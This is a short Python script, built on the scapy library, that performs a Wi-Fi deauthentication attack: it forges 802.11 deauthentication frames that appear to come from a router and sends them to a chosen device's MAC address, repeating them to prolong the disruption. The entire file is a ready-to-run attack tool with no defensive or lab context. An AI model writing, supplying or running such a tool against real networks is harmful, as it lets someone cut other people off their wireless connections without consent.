# disconnect other devices from the network using deaunthetication attack
# sudo pip install scapy
# sudo pip install termcolor

from scapy.all import *
from termcolor import colored


def deauth(target_mac, gateway_mac, count=10):
    # Define the deauthentication packet
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)

    print(f"Sending {count} deauthentication packets to {target_mac} from {gateway_mac}")
    # Send the packet multiple times
    sendp(packet, inter=0.1, count=count, iface="wlan0", verbose=1)

def main():
    # Enter the MAC address of the device you want to disconnect
    target_mac = input("Enter the MAC address of the target device: ")
    # Enter the MAC address of the Wi-Fi router/gateway
    gateway_mac = input("Enter the MAC address of the router: ")
    # Number of deauthentication packets to send
    count = int(input("Enter the number of packets to send (higher for longer disruption - 100-1000): "))

    deauth(target_mac, gateway_mac, count)

if __name__ == "__main__":
    main()
